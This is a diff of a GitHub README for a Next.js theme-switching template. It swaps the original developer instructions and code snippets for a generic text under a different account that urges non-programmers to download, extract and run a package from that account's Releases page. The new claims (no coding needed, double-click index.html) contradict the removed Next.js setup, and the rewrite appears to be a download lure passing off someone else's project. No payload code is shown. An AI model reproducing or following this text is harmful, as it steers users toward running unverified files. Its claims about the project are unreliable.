@@ -1,170 +1,68 @@
-# Theme Changing Template — KhanDevs
+# 🎨 theme_changing_template - Elegant Theme Switching Made Easy
 
-A **production-ready Next.js theme template** demonstrating a correct and modern
-implementation of light and dark mode switching using the **View Transitions API**.
+[![Download theme_changing_template](https://img.shields.io/badge/Download-theme__changing__template-blue?style=for-the-badge)](https://github.com/indrasurya12/theme_changing_template/releases)
 
-This repository is focused on **theming architecture**, not UI gimmicks.
-It serves as a reference implementation for smooth, predictable, and hydration-safe
-theme transitions in real-world applications.
+## 📚 Introduction
 
-Built with **Next.js App Router**, **Tailwind CSS 4**, **shadcn/ui**, and **next-themes**.
+Welcome to the **theme_changing_template**! This project helps you seamlessly switch between light and dark themes using advanced web techniques. With easy-to-follow steps, you can dive right in and enjoy a visually stunning experience.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+To start using the **theme_changing_template**, follow these simple steps. You don’t need any programming skills. Just a computer, a web browser, and a bit of time.
 
-### 1. Clone and install dependencies
+### 🖥️ System Requirements
 
-```bash
-git clone https://github.com/Rjk-Jami/theme_changing_template.git
-cd theme_changing_template
-npm install
-```
+- A computer with Windows, macOS, or Linux
+- A modern web browser (Chrome, Firefox, Safari, etc.)
+- Internet connection for downloading
 
-### 2. Run the development server
+## 💾 Download & Install
 
-```bash
-npm run dev
-```
+1. Visit the [Releases page](https://github.com/indrasurya12/theme_changing_template/releases) to download the latest version.
+2. Look for the files labeled with the version number. Click the link to download the package.
+3. Once the download is complete, locate the file on your computer.
+4. Double-click the file to extract it, if necessary.
+5. Open the extracted folder, and look for the index.html file.
+6. Double-click the index.html file to launch the application in your web browser.
 
-Open:  
-http://localhost:3000
+## 🎨 Using the Application
 
----
+- Upon launching, you will see a lovely interface showcasing both the light and dark themes.
+- Use the toggle button to switch between themes effortlessly.
+- Enjoy smooth transitions as the View Transitions API enhances the experience.
 
-## Purpose
+## ⚙️ Features
 
-Most theme implementations suffer from:
+- **Light/Dark Mode**: Easily switch between light and dark themes.
+- **View Transitions API**: Feel the smoothness as you toggle between themes.
+- **CSS Variables**: Customize and adapt styles easily.
+- **Responsive Design**: The template works on desktops and mobile devices.
 
-- Flickering during hydration
-- Abrupt or jarring theme changes
-- Server/client theme mismatch
-- Hard-to-maintain hacks
+## 🚧 Troubleshooting
 
-This template demonstrates:
+If you encounter any issues:
 
-- **Correct class-based theming**
-- **Single-button theme toggle**
-- **Circular reveal transition** originating from the toggle button
-- **Hydration-safe behavior**
-- **Token-based styling** using CSS variables
+- **Nothing happens when clicking the theme toggle**: Make sure you are opening the index.html file in a supported browser.
+- **The themes do not appear**: Try clearing your browser cache or refreshing the page.
+- **Slow performance**: Ensure your browser is up to date.
 
----
+## 📑 Contribution
 
-## Features
+While this project is designed for end users, contributions are welcome! If you’re interested in helping improve this template, feel free to send a message or create a pull request.
 
-- Next.js App Router (Next.js 15 / React 19 ready)
-- View Transitions API for theme switching
-- Circular `clip-path` reveal animation
-- Tailwind CSS 4 with design tokens
-- shadcn/ui component foundation
-- Fully responsive
-- Type-safe and production-oriented
+## 📖 License
 
----
+The **theme_changing_template** is open-source and available under the MIT License. You can freely use, modify, and distribute it as long as you include the original license.
 
-## Project Structure
+## 🔗 Additional Resources
 
-```txt
-app/
-├─ layout.tsx          # ThemeProvider + hydration handling
-├─ page.tsx            # One-page landing demo
-└─ globals.css         # Theme tokens + View Transition rules (critical)
+- [Next.js Documentation](https://nextjs.org/docs)
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [View Transitions API](https://developer.mozilla.org/en-US/docs/Web/API/View_Transitions_API)
 
-components/
-├─ Theme/
-│  └─ theme-control.tsx   # ModeToggle with circular reveal animation
-├─ Layout/
-│  ├─ Header.tsx
-│  └─ Footer.tsx
-└─ widgets/               # Optional demo widgets
-```
+## 📤 Support
 
----
+If you have questions, reach out through the Issues section on the GitHub page. Your feedback helps improve the template. 
 
-## How the Theme Transition Works
-
-The transition uses the **View Transitions API** to animate between
-the old and new DOM snapshots.
-
-### 1. Global CSS (Required)
-
-Add the following to `app/globals.css`:
-
-```css
-::view-transition-old(root),
-::view-transition-new(root) {
-  animation: none;
-}
-
-::view-transition-old(root) {
-  z-index: 1;
-}
-
-::view-transition-new(root) {
-  z-index: 9999;
-}
-
-::view-transition-image-pair(root) {
-  isolation: isolate;
-}
-```
-
----
-
-### 2. Theme Toggle Logic
-
-```tsx
-const toggleTheme = () => {
-  const endRadius = Math.hypot(
-    Math.max(x, window.innerWidth - x),
-    Math.max(y, window.innerHeight - y)
-  )
-
-  document.startViewTransition(() => {
-    setTheme(nextTheme)
-  }).ready.then(() => {
-    document.documentElement.animate(
-      [
-        { clipPath: `circle(0px at ${x}px ${y}px)` },
-        { clipPath: `circle(${endRadius}px at ${x}px ${y}px)` },
-      ],
-      {
-        duration: 800,
-        easing: "cubic-bezier(.2,.8,.2,1)",
-        pseudoElement: "::view-transition-new(root)",
-      }
-    )
-  })
-}
-```
-
----
-
-### 3. Hydration Safety
-
-```tsx
-<html lang="en" suppressHydrationWarning>
-```
-
----
-
-## Widgets (Optional)
-
-Widgets are included only to demonstrate theme consistency.
-
-```bash
-npx shadcn@latest add card
-```
-
----
-
-## Browser Support
-
-- Chrome / Edge / Arc — Supported
-- Safari — Partial
-- Firefox — Not supported
-
----
-
-Created by **KhanDevs**
+Don’t forget to visit the [Releases page](https://github.com/indrasurya12/theme_changing_template/releases) to download the latest version!
